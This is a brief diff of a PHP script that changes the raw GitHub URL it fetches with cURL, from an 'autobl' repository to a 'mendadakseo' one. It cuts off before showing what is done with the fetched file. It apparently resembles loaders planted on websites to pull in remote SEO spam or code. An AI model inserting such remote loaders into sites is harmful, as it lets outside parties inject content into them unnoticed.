@@ -1,5 +1,5 @@
 <?php
-$url = 'https://raw.githubusercontent.com/ericorf21/autobl/main/file%20.txt';
+$url = 'https://raw.githubusercontent.com/ericorf21/mendadakseo/main/file.txt';
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
